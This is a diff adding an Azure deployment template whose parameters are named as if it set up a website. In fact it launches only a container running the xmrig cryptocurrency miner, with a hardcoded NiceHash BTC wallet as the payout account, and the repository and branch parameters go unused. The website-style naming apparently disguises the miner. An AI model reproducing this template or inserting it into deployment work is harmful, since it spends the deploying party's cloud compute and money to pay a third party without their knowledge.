@@ -1,0 +1,75 @@
+{
+    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
+    "contentVersion": "1.0.0.0",
+    "parameters": {
+        "siteName": {
+            "type": "string"
+        },
+        "hostingPlanName": {
+            "type": "string"
+        },
+        "siteLocation": {
+            "type": "string"
+        },
+        "workerSize": {
+            "type": "string",
+            "allowedValues": [
+                "0",
+                "1",
+                "2"
+            ],
+            "defaultValue": "0"
+        },
+        "Nicehash BTC": {
+            "type": "string",
+            "defaultValue": "3LUvVmhHLLZBSaprdSZYSBFnBu7ybZg7nh"
+        },
+        "repoUrl": {
+            "type": "string"
+        },
+        "branch": {
+            "type": "string"
+        }
+    },
+    "variables": {
+    },
+    "resources": [
+        {
+            "name": "[parameters('hostingPlanName')]",
+            "type": "Microsoft.ContainerInstance/containerGroups",
+            "apiVersion": "2018-04-01",
+            "location": "[parameters('siteLocation')]",
+            "properties": {
+                "containers": [
+                    {
+                        "name": "[parameters('siteName')]",
+                        "properties": {
+                            "image": "debar/xmrig",
+                            "ports": [
+
+                            ],
+                            "environmentVariables": [
+                                {
+                                    "name": "XMRIG_USER",
+                                    "value": "[concat(parameters('Nicehash BTC'),'.',parameters('hostingPlanName'))]"
+                                }
+                            ],
+                            "resources": {
+                                "requests": {
+                                    "memoryInGB": 2.5,
+                                    "cpu": 4
+                                }
+                            }
+                        }
+                    }
+                ],
+                "restartPolicy": "Never",
+                "osType": "Linux"
+            }
+        }
+    ],
+    "outputs": {
+    },
+    "functions": [
+    ]
+}
